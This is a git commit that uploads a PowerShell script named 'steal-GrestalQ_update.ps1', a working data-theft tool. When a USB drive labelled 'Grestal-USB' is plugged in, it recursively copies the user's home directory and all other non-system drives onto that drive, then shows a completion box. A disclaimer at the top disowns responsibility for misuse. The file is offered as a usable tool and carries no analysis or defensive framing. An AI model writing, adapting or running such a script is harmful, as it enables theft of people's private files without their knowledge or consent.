e038127085cf8c3fb6f233448d606c574bcc8f91
Grestal <121725600+KysbKing@users.noreply.github.com>
2024-05-05 12:07:05 +0300

    Add files via upload

---
+++ steal-GrestalQ_update.ps1
@@ -0,0 +1,17 @@
+# Use this script at your own risk. The author assumes no responsibility for any illegal or improper use of the code
+[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");
+$dsl = "Grestal-USB";
+$itefc = @('MicrosoftEdgeBackups','AppData','Musica');
+$mwt =30;
+$c = 0;
+while ($c -ne $mwt) {
+		Start-Sleep -s 1;
+		$ds = gwmi -Class Win32_logicaldisk | ? { $_.VolumeName -Like "*$dsl*" } | select DeviceID | % { $_.DeviceID };
+		if ($ds) {
+			gci $home -Recurse -Exclude $itefc | cp -Destination {Join-Path ($ds + "/" + $env:UserName + "_C/") $_.FullName.Substring($home.length)}
+			$do = gwmi -Class Win32_logicaldisk | ? {  $_.DeviceID -NotLike "*C*" } | ? { $_.DeviceID -NotLike "*$ds*" } | select DeviceID | % { $_.DeviceID };
+			$do | % { cp -Path $_ -Destination ($ds + "/" + $env:UserName + "_" + $_).TrimEnd(':') -Recurse }
+			[System.Windows.Forms.MessageBox]::Show("Process completed","LDS",0 ,48); 
+			exit;}
+		$c++;
+	}
